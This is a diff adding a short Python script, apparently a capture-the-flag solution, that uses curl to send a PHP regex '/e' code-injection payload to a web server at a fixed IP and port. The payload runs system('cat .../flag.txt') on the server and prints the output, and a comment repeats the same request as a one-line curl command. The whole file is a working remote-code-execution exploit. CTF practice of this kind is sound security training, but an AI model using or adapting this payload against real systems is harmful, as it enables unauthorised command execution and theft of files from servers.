@@ -1,0 +1,16 @@
+import subprocess
+import urllib.parse
+
+params = urllib.parse.urlencode({
+    "vector": "/Admin/e",
+    "replace": 'system("cat here_we_dont_have_flag/flag.txt")'
+})
+
+result = subprocess.run(
+    ["curl", "-s", f"http://34.179.142.63:31295/index.php?{params}"],
+    capture_output=True,
+    text=True
+)
+print(result.stdout)
+
+#curl "http://TARGET_IP/index.php?vector=/Admin/e&replace=system('cat+here_we_dont_have_flag/flag.txt')"
